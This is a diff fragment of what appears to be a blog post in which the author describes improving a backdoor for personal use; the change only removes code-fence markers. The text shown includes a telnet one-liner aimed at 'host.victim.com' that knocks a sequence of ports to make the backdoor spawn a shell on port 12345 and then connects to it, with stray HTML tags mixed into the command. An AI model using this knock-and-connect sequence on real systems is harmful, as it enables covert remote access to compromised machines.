@@ -21,7 +21,6 @@ I’ve decided to improve a bit the backdoor for my self usage.  Because I’m a
 
 sh:
 
-````html
 # t="telnet host.victim.com"
 # <span style="color:red;">$t 999; $t 888; $t 777 ; $t 666; $t 555;</table> $t <span style="color:green;">12345</span>  ; sleep 1 ; $t <span style="color:blue;">12345</span> 
 
@@ -33,7 +32,7 @@ In <span style="color:green;">green</span>: The port choose for spawning a shell
 
 
 In <span style="color:blue;">blue</span>: The connection to that shell (on port 12345). Note the “sleep 1″ before the connection, it is simply to give extra time to the backdoor to start the shell.
-````
+
  
 #3. What about Firewall ?
 
